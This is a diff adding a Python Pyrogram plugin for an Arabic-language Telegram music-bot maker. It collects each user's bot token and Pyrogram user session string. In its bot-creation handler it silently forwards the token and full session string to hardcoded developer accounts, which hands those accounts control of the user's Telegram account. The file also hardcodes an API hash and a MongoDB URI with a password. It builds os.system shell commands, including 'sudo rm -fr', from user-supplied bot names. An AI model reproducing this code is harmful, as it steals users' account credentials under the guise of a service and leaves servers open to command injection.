@@ -1,0 +1,882 @@
+import os
+import sys
+import asyncio
+import re
+import shutil
+import sys
+import psutil
+import glob
+import random
+import requests
+from asyncio import sleep
+from pyrogram import Client, filters
+from pyrogram import types
+from pyrogram import enums
+from sys import version as pyver
+from pyrogram import __version__ as pyrover
+from pyrogram import __version__ as pyrover
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
+from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid)
+from pymongo import MongoClient
+from bot import SUDORS
+from bot import*
+from motor.motor_asyncio import AsyncIOMotorClient as mongo_client
+from pymongo import MongoClient
+from motor.motor_asyncio import AsyncIOMotorClient as _mongo_client_
+from pyrogram.errors import FloodWait
+from bot import *
+from pyrogram import Client, filters
+from pyrogram.errors import PeerIdInvalid
+from typing import List, Union, Callable
+from os import execle, environ
+from pyrogram.errors import FloodWait, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded
+from redis import Redis
+from pyrogram import Client, filters
+from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message, InlineKeyboardMarkup, InlineKeyboardButton
+from Maker.Storage import add_new_user, is_user, get_users, users_backup, del_user
+from Maker.Storage import*
+from pymongo import MongoClient
+from pyrogram import Client, filters
+import random
+from typing import Dict, List, Union
+
+
+
+
+# ============ متغيرات و مطورين ============
+API_ID = 8186557
+API_HASH = "efd77b34c69c164ce158037ff5a0d117"
+Bots = []
+OFF = True
+DEVS = ["KA_FRA_WI1","DevVeGa", "M_D_O_2"]
+ch = "kafra_wi_1"
+
+# ============ تخزين و قاعدة بيانات db ============
+
+MONGO_URI = "mongodb+srv://VeGaMusIc:VeGaOne@cluster0.nf0ml.mongodb.net/?retryWrites=true&w=majority"
+mongo_client = MongoClient(MONGO_URI)
+mongodb = mongo_client.VeGaX
+users_collection = mongodb.tgusersdb
+chats_collection = mongodb.chats
+db = mongo_client["KIM"]["sheikh7skkx728329"]
+mkchats = db.chatss
+blocked = []
+blockeddb = db.blocked
+mk = []
+
+
+
+def ss():
+    dbb = db.find({})
+    for x in dbb:
+        xx = [x["username"], x["dev"]]
+        Bots.append(xx)
+        os.system(f"screen -XS {xx[0]} quit")
+        os.system(f"cd Maked/{xx[0]} && screen -d -m -S {xx[0]} python3 -m VeGaXMusic")
+        print(f"Done {xx}")
+    ddb = mkchats.find({})
+    for x in ddb:
+        mk.append(int(x["chat_id"]))
+    bb = blockeddb.find({})
+    for x in bb:
+        blocked.append(int(x["user_id"]))
+    return
+ss()
+
+@Client.on_message(filters.private)
+async def me(client, message):
+    if not message.chat.id in mk:
+        mk.append(message.chat.id)
+        mkchats.insert_one({"chat_id": message.chat.id})    
+    if OFF and not (message.text in ["ᴍᴀᴅᴏ", "ᴋᴀꜰʀᴀᴡɪ", "ꝛᴇʟᴇᴧꜱᴇ", "ꜱʜᴇɪᴋʜ", "INFO","رجوع"]):
+        if not message.from_user.id in SUDORS:
+            return await message.reply_text("الشيخ مـكتـمل !!")    
+    if message.chat.id in blocked:
+        return await message.reply_text("ارنــب انـت مــحظـور مـن الشيخ 🖕😎")    
+    try:
+        await client.get_chat_member(ch, message.from_user.id)
+    except Exception:
+        return await message.reply_video(
+            video="https://t.me/kafra_wi_1/124",
+            caption=f"━━━ılıı◁❚ ✘ꜱʜᴇɪᴋʜ-ᴍᴜsɪᴄ✘ ❚▷ıılı━━━\n\n<blockquote><b>مرحبا :{message.from_user.mention}\n\n╮⦿ عليك بالاشتراك اولا في قناه الشيخ\n╯⦿ تم تطويري من قبل : @M_D_O_2</blockquote>",
+            reply_markup=InlineKeyboardMarkup(
+                [
+                    [InlineKeyboardButton("ꜱʜᴇɪᴋʜ", url=f"https://t.me/{ch}")]
+                ]
+            )
+        )
+    message.continue_propagation()
+    
+
+
+@Client.on_message(filters.command(["ꜱʜᴇɪᴋʜ"], ""))
+async def SourceVeGaX(client: Client, message):
+    await message.reply_video(
+        video="https://t.me/kafra_wi_1/124",
+        caption="<blockquote><b>╭❖ᚐᴡᴇʟᴄᴏᴍᴇ ᴛᴏ\n╰⬣ᚐ[ꜱʜᴇɪᴋʜ ꜱᴏᴜꝛᴄᴇ](https://t.me/kafra_wi_1)\n╭⊚ᚐ[ɢꝛᴏᴜᴘ](https://t.me/VeGaSuport)\n╰❖ᚐ[ᴄᴧʟɴɴʟᴇ](https://t.me/kafra_wi_1)</b></blockquote>",
+        reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton("ꜱʜᴇɪᴋʜ", url="https://t.me/kafra_wi_1"),
+                ],
+                [
+                    InlineKeyboardButton("Me ", url="https://t.me/M_D_O_2"),
+                ],
+            ]
+        ),
+    )
+
+
+@Client.on_message(filters.command(["INFO"], ""))
+async def cast(client, message):
+    kep = ReplyKeyboardMarkup([["ᴍᴀᴅᴏ","ᴋᴀꜰʀᴀᴡɪ"], [" ꜱʜᴇɪᴋʜ"], ["ꝛᴇʟᴇᴧꜱᴇ"], ["رجوع"]], resize_keyboard=True)
+    await message.reply_text("<blockquote><b>╮◉ مـرحـبآ بك عزيزي المطور\n╯◉ هنا قسم الشيخ والمطورين</b></blockquote>", reply_markup=kep)
+        
+
+
+@Client.on_message(filters.command(["ꝛᴇʟᴇᴧꜱᴇ"], ""))
+async def khalid(client: Client, message):
+    await message.reply_video(
+        video=f"https://t.me/kafra_wi_1/124",
+        caption=f"""<b><blockquote>
+╭❖  ꜱᴏᴜꝛᴄᴇ.ɴᴧᴍᴇ: ꜱʜᴇɪᴋʜ
+│᚜❖ ꜱʏꜱᴛᴇᴍ: ᴘʏᴛʜᴏɴ
+│᚜❖ ʟᴧɴɢᴜᴧɢᴇ: ɪꜱ ᴧꝛᴧʙɪᴄ
+│᚜❖ ꝛᴇʟᴇᴧꜱᴇ: 2.1 ᴠ
+│᚜❖ ᴅᴧᴛᴇ ᴄꝛᴇᴧᴛᴇᴅ: 5 -8 -2017
+╰❖  ᴏᴡɴᴇꝛ ᴏꜰ ꜱʜᴇɪᴋʜ:[ᴢᴇʀᴏ⸥](https://t.me/M_D_O_2)
+</b></blockquote>""",
+        reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        "ᴍᴀᴅᴏ", url=f"https://t.me/M_D_O_2"),         
+                ],[
+                    InlineKeyboardButton(
+                        "ꜱʜᴇɪᴋʜ", url=f"https://t.me/kafra_wi_1"),
+               ],
+          ]
+        ),
+    )
+
+
+# ============ استدعاء المطورين============
+
+
+@Client.on_message(filters.command(["مطور الشيخ","ᴍᴀᴅᴏ"], ""))
+async def M_D_O_2(client: Client, message):   
+    usr = await client.get_chat("M_D_O_2")
+    name = usr.first_name
+    photo = await client.download_media(usr.photo.big_file_id)
+    await message.reply_photo(photo,       caption=f"<blockquote><b><b>»⭓ᴍᴜˢɪᴄ✘ꜱʜᴇɪᴋʜ♪</b>\n\n╭❖ᚐɴᴧᴍᴇᚐ: {name}\n│᚜❖ᚐᴜꜱᴇꝛ: @{usr.username}\n│᚜❖ᚐɪᴅᚐ: <code>{usr.id}</code>\n╰❖ᚐʙɪᴏᚐ: {usr.bio}</b></blockquote>", 
+    reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        name, url=f"https://t.me/{usr.username}"),
+                    ],[
+                        InlineKeyboardButton(
+                        "Me ", url=f"https://t.me/CEOVEGA"),
+                ],
+            ]
+        ),
+    )
+
+
+@Client.on_message(filters.command(["ᴋᴀꜰʀᴀᴡɪ"], ""))
+async def KATAVEGA(client: Client, message):   
+    usr = await client.get_chat("KA_FRA_WI1")
+    name = usr.first_name
+    photo = await client.download_media(usr.photo.big_file_id)
+    await message.reply_photo(photo,       caption=f"<blockquote><b><b>»⭓ᴍᴜˢɪᴄ✘ꜱʜᴇɪᴋʜ♪</b>\n\n╭❖ᚐɴᴧᴍᴇᚐ: {name}\n│᚜❖ᚐᴜꜱᴇꝛ: @{usr.username}\n│᚜❖ᚐɪᴅᚐ: <code>{usr.id}</code>\n╰❖ᚐʙɪᴏᚐ: {usr.bio}</b></blockquote>", 
+    reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        name, url=f"https://t.me/{usr.username}"),
+                    ],[
+                        InlineKeyboardButton(
+                        "Me ", url=f"https://t.me/CEOVEGA"),
+                ],
+            ]
+        ),
+    )
+
+
+
+
+    
+@Client.on_message(filters.command(["مطور الشيخ","ꜰᴏx"], ""))
+async def DevVeGa(client: Client, message):    
+    usr = await client.get_chat("DevVeGa")
+    name = usr.first_name
+    photo = await client.download_media(usr.photo.big_file_id)
+    await message.reply_photo(photo,       caption=f"<blockquote><b><b>»⭓ᴍᴜˢɪᴄ✘ꜱʜᴇɪᴋʜ♪</b>\n\n╭❖ᚐɴᴧᴍᴇᚐ: {name}\n│᚜❖ᚐᴜꜱᴇꝛ: @{usr.username}\n│᚜❖ᚐɪᴅᚐ: <code>{usr.id}</code>\n╰❖ᚐʙɪᴏᚐ: {usr.bio}</b></blockquote>", 
+    reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        name, url=f"https://t.me/{usr.username}"),
+                    ],[
+                        InlineKeyboardButton(
+                        "Me", url=f"https://t.me/CEOVEGA"),
+                ],
+            ]
+        ),
+    )
+
+
+
+# ============ دالة الحظر و المحظورين ============
+
+@Client.on_message(filters.command("حظر", ""))
+async def ban(client, message):
+    if message.from_user.id not in SUDORS:
+        return
+    m = await client.ask(message.chat.id, "<blockquote>ارسل معرف المستخدم الان</blockquote>")
+    text = m.text.replace("@", "")
+    try:
+        user = await client.get_chat(text)
+        user_id = user.id
+        if user_id in blocked:
+            return await message.reply_text("<blockquote>الارنـب مـحظـور من قبل</blockquote>")
+        blocked.append(user_id)
+        blockeddb.insert_one({"user_id": user_id})
+        await message.reply_text("<blockquote>تـم حـظـر الارنـب</blockquote>")
+    except Exception as e:
+        await message.reply_text("<blockquote>تأكد من معرف المستخدم</blockquote>")
+
+
+
+@Client.on_message(filters.command("الغاء حظر", ""))
+async def unban(client, message):
+    if message.from_user.id not in SUDORS:
+        return
+    m = await client.ask(message.chat.id, "<blockquote>ارسل معرف الارنـب الان</blockquote>")
+    text = m.text.replace("@", "")
+    try:
+        user = await client.get_chat(text)
+        user_id = user.id
+        if user_id not in blocked:
+            return await message.reply_text("<blockquote>الارنـب غير محظور</blockquote>")
+        blocked.remove(user_id)
+        blockeddb.delete_one({"user_id": user_id})
+        await message.reply_text("<blockquote>تم الغاء حظر المستخدم</blockquote>")
+    except Exception as e:
+        await message.reply_text("<blockquote>تأكد من معرف المستخدم</blockquote>")
+    
+
+
+@Client.on_message(filters.command("المحظورين", ""))
+async def list_blocked_users(client, message):
+    if message.from_user.id not in SUDORS:
+        return
+    if not blocked:
+        return await message.reply_text("لا يوجد محظوريين في الشيخ")
+    user_mentions = [await client.get_users(user_id) for user_id in blocked]
+    response = "<b><u>قائمة المحظورين من الشيخ:</u></b>\n"
+    for i, user in enumerate(user_mentions, start=1):
+        response += f"<b>{i} ➻ {user.mention}</b>\n"
+    count = len(blocked)
+    response += f"\n<blockquote><b>عددتهم :</b> ❰❪ {count} ❫❱</b></blockquote>"
+    await message.reply_text(response, parse_mode=enums.ParseMode.HTML)
+
+
+@Client.on_message(filters.command("مسح المحظورين", ""))
+async def clear_blocked_users(client, message):
+    if message.from_user.id not in SUDORS:
+        return
+    if not blocked:
+        return await message.reply_text("لا يوجد محظوريين في الشيخ")
+    count = len(blocked) 
+    blocked.clear() 
+    await message.reply_text(f"<blockquote>تم مسح جميع المحظورين بنجاح. وعددهم {count}</blockquote>")
+
+
+# ============ دالة رفع مطورين لفيجا ============
+
+@Client.on_message(filters.command("رفع مطور", ""))
+async def promote_dev(client, message):
+    if message.from_user.id not in [7623838169, 8122544723, 8176410693]:
+        return await message.reply_text("ليس لديك صلاحية لتنفيذ هذا الأمر.")
+    m = await client.ask(message.chat.id, "ارسل معرف المستخدم الان")
+    user_input = m.text.replace("@", "")
+    try:
+        user = await client.get_chat(user_input)
+        user_id = user.id
+        if user_id in SUDORS:
+            return await m.reply_text("المستخدم بالفعل مطور")
+        SUDORS.append(user_id)
+        await m.reply_text("تم رفع المستخدم كمطور")
+    except PeerIdInvalid:
+        await message.reply_text("تأكد من معرف المستخدم")
+    except Exception as e:
+        await message.reply_text(f"حدث خطأ: {e}")
+
+
+
+@Client.on_message(filters.command("تنزيل مطور", ""))
+async def demote_dev(client, message):
+    if message.from_user.id not in [7623838169, 8122544723, 8176410693]:
+        return await message.reply_text("ليس لديك صلاحية لتنفيذ هذا الأمر.")        
+    m = await client.ask(message.chat.id, "ارسل معرف المستخدم الان")
+    user_input = m.text.replace("@", "")
+    try:
+        user = await client.get_chat(user_input)
+        user_id = user.id
+
+        if user_id not in SUDORS:
+            return await message.reply_text("هذا المستخدم ليس مطور")
+        SUDORS.remove(user_id)
+        await message.reply_text("تم تنزيل المستخدم من المطورين")
+    except PeerIdInvalid:
+        await message.reply_text("تأكد من معرف المستخدم")
+    except Exception as e:
+        await message.reply_text(f"حدث خطأ: {e}")
+
+@Client.on_message(filters.command("المطورين", ""))
+async def list_SUDORS_users(client, message):
+    if message.from_user.id not in SUDORS:
+        return await message.reply_text("ليس لديك صلاحية لتنفيذ هذا الأمر.")
+    if not SUDORS:
+        return await message.reply_text("لا يوجد مطورين في القائمة")
+    try:
+        user_mentions = await asyncio.gather(*[client.get_users(user_id) for user_id in SUDORS])
+        response = "<blockquote><b><u>قائمة مطورين:</u></b></blockquote>\n"
+        for i, user in enumerate(user_mentions, start=1):
+            response += f"<b>{i}- {user.mention}</b>\n"
+        count = len(SUDORS)
+        response += f"\n<blockquote><b>عدد المطورين:</b> ❰❪ {count} ❫❱</b></blockquote>"
+        await message.reply_text(response, parse_mode=enums.ParseMode.HTML)
+    except Exception as e:
+        await message.reply_text(f"حدث خطأ: {e}")
+
+    
+# ============ دوال قفل و الفتح و صنع ============
+
+
+@Client.on_message(filters.command(["فتح الصانع", "قفل الصانع"], "") & filters.private)
+async def onOFF(client, message):
+    if not message.from_user.id in SUDORS:
+        return    
+    global OFF    
+    if message.text == "فتح الصانع":
+        if OFF is None:
+            return await message.reply_text("<blockquote>الشيخ مفتوح من قبل</blockquote>")
+        OFF = None
+        return await message.reply_text("<blockquote>تـم فـتـح الشيخ » بـنجـاح</blockquote>")    
+    else:
+        if OFF is True:
+            return await message.reply_text("<blockquote>الشيخ مقفول من قبل</blockquote>")
+        OFF = True
+        await message.reply_text("<blockquote>تـم قـفـل الشيخ » بـنجـاح</blockquote>")
+
+
+@Client.on_message(filters.command("صنع بوت", "") & filters.private)
+async def maked(client, message):
+    if not message.from_user.id in SUDORS:
+        for x in Bots:
+            if int(x[1]) == message.from_user.id:
+                return await message.reply_text("<blockquote>لـقد قمـت بـصنـع بـوت مـن قـبـل</blockquote>")
+    try:
+        ask = await client.ask(message.chat.id, "<blockquote>ارسـل تـوكـن الـبـوت من : @BotFather</blockquote>", timeout=300)
+        TOKEN = ask.text.strip()        
+        if not TOKEN.startswith('') or ':' not in TOKEN:
+            return await message.reply_text("<blockquote>التوكن غير صالح! يرجى إرسال توكن صحيح من @BotFather</blockquote>")
+        temp_bot = Client("temp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
+        try:
+            await temp_bot.start()
+            bot_info = await temp_bot.get_me()
+            if not bot_info:
+                await temp_bot.stop()
+                return await message.reply_text("<blockquote>فشل التحقق من التوكن! يرجى التأكد من صحت</blockquote>ه")
+            username = bot_info.username
+            await temp_bot.stop()
+        except Exception as e:
+            return await message.reply_text(f"خطأ في التوكن:")            
+    except TimeoutError:
+        return await message.reply_text("<blockquote>انتهى الوقت المحدد لإرسال التوكن</blockquote>")
+    except Exception as e:
+        return await message.reply_text(f"حدث خطأ: {str(e)}")
+    try:
+        ask = await client.ask(message.chat.id, "<blockquote>ارسـل جـلسـه بـيروجـرام</blockquote>", timeout=300)
+        SESSION = ask.text.strip()
+        temp_user = Client("temp_user", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
+        try:
+            await temp_user.start()
+            user_info = await temp_user.get_me()
+            if not user_info:
+                await temp_user.stop()
+                return await message.reply_text("<blockquote>فشل التحقق من الجلسة! يرجى التأكد من صحتها</blockquote>")
+            await temp_user.stop()
+        except Exception as e:
+            return await message.reply_text(f"خطأ في الجلسة")            
+    except TimeoutError:
+        return await message.reply_text("<blockquote>انتهى الوقت المحدد لإرسال الجلسة</blockquote>")
+    except Exception as e:
+        return await message.reply_text(f"حدث خطأ: {str(e)}")    
+    Dev = message.from_user.id
+    zero = message.from_user.username
+    if message.from_user.id in SUDORS:
+        try:
+            ask = await client.ask(message.chat.id, "<blockquote>ارسـل ايـدي المـطور</blockquote>", timeout=300)
+            try:
+                Dev = int(ask.text)
+            except:
+                return await message.reply_text("<blockquote>قم بارسال الايدي بشكل صحيح</blockquote>")
+        except TimeoutError:
+            return await message.reply_text("<blockquote>انتهى الوقت المحدد لإرسال الأيدي</blockquote>")
+    for x in Bots:
+        if x[0] == username:
+            return await message.reply_text("<blockquote>لقد قمت بصنع هذا البوت من قبل</blockquote>")    
+    try:
+        os.system(f"cp -a Make Maked/{username}")
+        env = open(f"Maked/{username}/.env", "w+", encoding="utf-8")
+        x = f'ID = {username}\nBOT_TOKEN = {TOKEN}\nSTRING_SESSION = {SESSION}\nOWNER_ID = {Dev}\nLOG_GROUP_ID = {Dev}'
+        env.write(x)
+        env.close()
+        os.system(f"cd Maked/{username} && chmod +x * && screen -d -m -S {username} python3 -m VeGaXMusic")
+        oo = [username, Dev, zero]
+        Bots.append(oo)
+        for chat in DEVS:
+            try:
+                usr = await client.get_users(message.from_user.id)
+                name = usr.first_name
+                if usr.photo:
+                    photo = await client.download_media(usr.photo.big_file_id)
+                    await client.send_photo(
+                        chat, photo,
+                        caption=f"<b><blockquote>تـم دخـول بـوت جديد الي الشيخ</blockquote>\n\n<blockquote>╭⦿ᚐ⸢ᴜsᴇꝛ ʙᴏᴛ⸥» @{username}\n╰⦿ᚐ⸢ᴛᴏᴋᴇɴ⸥ » `{TOKEN}`</blockquote>\n\n<blockquote>⸢˹sᴛꝛɪɴɢ✗ᴩʏꝛᴏɢꝛᴧᴍ : {pyrover}</blockquote>\n <code>{SESSION}</code> \n\n<blockquote>╭⦿ᚐ⸢ᴏᴡɴᴇꝛ⸥» {message.from_user.mention}\n╰⦿ᚐ⸢ᴏᴡɴᴇꝛ ɪᴅ⸥ » <code>{Dev}</code></b></blockquote>",
+                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(name, url=f"https://t.me/{message.from_user.username}")]])
+                    )
+                else:
+                    await client.send_message(
+                        chat,
+                        f"<b><blockquote>تـم دخـول بـوت جديد الي الشيخ</blockquote>\n\n<blockquote>╭⦿ᚐ⸢ᴜsᴇꝛ ʙᴏᴛ⸥» @{username}\n╰⦿ᚐ⸢ᴛᴏᴋᴇɴ⸥ » `{TOKEN}`</blockquote>\n\n<blockquote>⸢˹sᴛꝛɪɴɢ✗ᴩʏꝛᴏɢꝛᴧᴍ : {pyrover}</blockquote>\n <code>{SESSION}</code> \n\n<blockquote>╭⦿ᚐ⸢ᴏᴡɴᴇꝛ⸥» {message.from_user.mention}\n╰⦿ᚐ⸢ᴏᴡɴᴇꝛ ɪᴅ⸥ » <code>{Dev}</code></b></blockquote>",
+                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(name, url=f"https://t.me/{message.from_user.username}")]])
+                    )
+            except Exception as e:
+                print(f"Error sending to dev {chat}: {e}")
+        data = {"username": username, "dev": Dev}
+        db.insert_one(data)        
+        msg = await message.reply("❤️")
+        await sleep(5)
+        await msg.delete()
+        bot_user = await client.get_me()
+        bot_id = bot_user.id
+        bot_name = bot_user.first_name        
+        try:
+            user = await client.get_users(bot_id)
+            Owner = user.first_name if user.first_name else "Owner Not Found"
+            photo = await client.download_media(user.photo.big_file_id) if user.photo and user.photo.big_file_id else None            
+            await message.reply_photo(
+                photo=photo,
+                caption=f"<b><blockquote>{bot_name}</blockquote>\n\n<blockquote>╮⦿ تـم تـشـغـيل بـوتـك بـنـجـاح\n╯⦿ عـلـي سـورس الشيخ مـيـوزك</b></blockquote>",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("ᴏᴡɴᴇʀ", url=f"https://t.me/{zero}"),
+                     InlineKeyboardButton("ʙᴏᴛ", url=f"https://t.me/{username}")],
+                    [InlineKeyboardButton("ꜱʜᴇɪᴋʜ", url="https://t.me/kafra_wi_1")]
+                ])
+            )
+        except Exception as e:
+            print(f"Error in final message: {e}")            
+    except Exception as e:
+        return await message.reply_text(f"حدث خطأ أثناء إنشاء البوت: {str(e)}")    
+    print("❰❪ 𝗘𝗡𝗧𝗲𝗥 𝗮 𝗡𝗲𝘄 𝗕𝗼𝘁♪ ❫❱")
+
+
+  
+
+
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗩.𝗘.𝗚.𝗔]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+
+
+
+
+@Client.on_message(filters.command("حذف بوت", "") & filters.private)
+async def deletbot(client, message):  
+   if not message.from_user.id in SUDORS:
+     for x in Bots:
+         bot = x[0]
+         if int(x[1]) == message.from_user.id:       
+           os.system(f"sudo rm -fr Maked/{bot}")
+           os.system(f"screen -XS {bot} quit")
+           Bots.remove(x)
+           xx = {"username": bot}
+           db.delete_one(xx)
+           return await message.reply_text("<blockquote>تـم طـرد بـوتـك من الشيخ..</blockquote>")
+     return await message.reply_text("<blockquote>لم تقم بصنع بوتات</blockquote>")
+   try:
+      bot = await client.ask(message.chat.id, "<blockquote>ارسـل مـعرف البوت</blockquote>", timeout=300)
+   except:
+      return
+   bot = bot.text.replace("@", "")
+   bot_found = False
+   for x in Bots:
+       if x[0] == bot:
+          Bots.remove(x)
+          xx = {"username": bot}
+          db.delete_one(xx)
+          bot_found = True
+          break
+   if not bot_found:
+       return await message.reply_text("<blockquote>تم حذف هذا البوت من قبل..؟</blockquote>")
+   os.system(f"sudo rm -fr Maked/{bot}")
+   os.system(f"screen -XS {bot} quit")
+   await message.reply_text(f"<blockquote><b>تم حـذف البـوت بنـجاح :  @{bot}</b></blockquote>")
+
+
+
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗩.𝗘.𝗚.𝗔]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+
+
+
+
+@Client.on_message(filters.command("البوتات المصنوعه", ""))
+async def botat(client, message):  
+  if not message.from_user.id in SUDORS:
+      return
+  o = 0
+  text = "<blockquote><b>──「 قـائـمة الـبـوتـات مـن الشيخ 」──</b></blockquote>\n\n"  
+  total_bots = len(Bots)
+  if total_bots > 0:
+      text += f"<blockquote><b>عدد البوتات :  {total_bots}</b></blockquote>\n\n"  
+  for x in Bots:
+      o += 1
+      if len(x) >= 3:
+          text += f"<blockquote><b>{o}- ᴅᴇᴠ : @{x[2]} | ʙᴏᴛ : @{x[0]}</blockquote>\n</b>"
+      else:
+          text += "<blockquote><b>لا يوجد بيانات للبوتات</b></blockquote>"
+  if o == 0:
+      return await message.reply_text("<blockquote>لا يوجد بوتات فـي الشيخ عزيزي المطور</blockquote>")  
+  await message.reply_text(text)
+
+
+
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗩.𝗘.𝗚.𝗔]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+
+
+@Client.on_message(filters.command("ايقاف البوت", ""))
+async def stop_specific_bot(c, message):
+ if message.from_user.id in [7623838169, 8122544723, 8176410693]:    
+    bot_username = await c.ask(message.chat.id, "ارسـل مـعرف البوت", timeout=300)
+    bot_username = bot_username.text.replace("@", "")    
+    if not bot_username:
+        await message.reply_text("**~ خطأ: يجب عليك تحديد اسم البوت.**")
+        return
+    msg = await message.reply("جاري ايقاف البوت...")
+    await asyncio.sleep(2)
+    await msg.delete()
+    if not os.path.exists('Maked'):
+        await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
+        return
+    bot_found = False  
+    for folder in os.listdir("Maked"):
+        if re.search('[Bb][Oo][Tt]', folder) and bot_username in folder: 
+            os.system(f'cd Maked/{folder} && chmod +x * && screen -X -S {folder} quit')
+            bot_found = True
+            break  
+    if not bot_found:
+        await message.reply_text("**لا يوجد بوت بهذا الاسم ليقافه**")
+    else:
+        await message.reply_text(f"**تم ايقاف البوت : @{bot_username}**")
+ else:
+    await message.reply_text("هذا الامر يخص الشيخ")
+
+
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗩.𝗘.𝗚.𝗔]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+
+
+
+@Client.on_message(filters.command("ايقاف البوتات", ""))
+async def stooop_Allusers(c, message):
+ if message.from_user.id in [7623838169, 8122544723, 8176410693]:
+    n = 0
+    msg = await message.reply("جاري ايقاف البوتات")
+    await asyncio.sleep(2)
+    await msg.delete()
+    if not os.path.exists('Maked'):
+        await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
+        return
+    for folder in os.listdir("Maked"):
+        if re.search('[Bb][Oo][Tt]', folder):
+            os.system('cd Maked/' + folder + ' && chmod +x * && screen -X -S ' + folder.replace("@", "") + ' quit')  
+            n += 1
+    if n == 0:
+        await message.reply_text("**لا يوجد بوتات ليقافها**")
+    else:
+        await message.reply_text(f"**تم ايقاف :  {n} بوت بنجاح**")
+ else:
+    await message.reply_text("هذا الامر يخص الشيخ")
+
+
+
+
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗩.𝗘.𝗚.𝗔]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+
+
+
+@Client.on_message(filters.command("تشغيل البوت", ""))
+async def start_single_bot(client, message):
+ if message.from_user.id in [7623838169, 8122544723, 8176410693]:
+    n = 0
+    try:
+        bot_username = await client.ask(message.chat.id, "ارسـل مـعرف البوت", timeout=300)
+        bot_username = bot_username.text.replace("@", "")        
+        if not bot_username:
+            await message.reply_text("**خطاء : لم يتم ارسال المعرف**")
+            return        
+        msg = await message.reply("**جاري تشغيل البوت..**")
+        await asyncio.sleep(2)
+        await msg.delete()
+        if not os.path.exists('Maked'):
+            await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
+            return
+        bot_folder = f"Maked/{bot_username}"
+        if os.path.exists(bot_folder) and re.search('[Bb][Oo][Tt]', bot_username):
+            os.system(f'cd {bot_folder} && screen -d -m -S {bot_username.replace("@", "")} python3 -m VeGaXMusic')
+            n += 1
+        if n == 0:
+            await message.reply_text("**لا يوجد بوت بهذا الاسم لتشغيله.**")
+        else:
+            await message.reply_text(f"**تم تشغيل بوت : @{bot_username} **")
+    except Exception as e:
+        await message.reply_text(f"**~ خطأ: {str(e)}**")
+ else:
+     await message.reply_text("هذا الامر يخص الشيخ")
+
+
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+# ▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂[𝗩.𝗘.𝗚.𝗔]▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+
+
+
+@Client.on_message(filters.command("تشغيل البوتات", ""))
+async def start_Allusers(c, message):
+ if message.from_user.id in [7623838169, 8122544723, 8176410693]:
+    n = 0
+    msg = await message.reply("جاري تشغيل جميع البوتات")
+    await asyncio.sleep(2)
+    await msg.delete()
+    if not os.path.exists('Maked'):
+        await message.reply_text("**~ خطأ: لا يوجد مجلد Maked.**")
+        return
+    for folder in os.listdir("Maked"):
+        if re.search('[Bb][Oo][Tt]', folder):
+            os.system('cd Maked/' + folder + ' && screen -d -m -S ' + folder.replace("@", "") + ' python3 -m VeGaXMusic')  
+            n += 1
+    if n == 0:
+        await message.reply_text("**لا يوجد بوتات لتشغيلها**")
+    else:
+        await message.reply_text(f"**تم تشغيل :  {n} بوت بنجاح**")
+ else:
+    await message.reply_text("هذا الامر يخص الشيخ")
+
+
+@Client.on_message(filters.command("حذف البوتات", "") & filters.private)
+async def delBots2(client, message):
+    if message.from_user.id in [7623838169, 8122544723, 8176410693]:  
+        keyboard = InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton("تأكيد الحذف", callback_data="confirm_delete")],
+                [InlineKeyboardButton("إلغاء", callback_data="cancel_delete")]
+            ]
+        )
+        await message.reply_text(
+            "لتأكيد حذف جميع البوتات، اضغط على الزر أدناه:",
+            reply_markup=keyboard
+        )
+    else:
+        await message.reply_text("هذا الأمر يخص الشيخ")
+
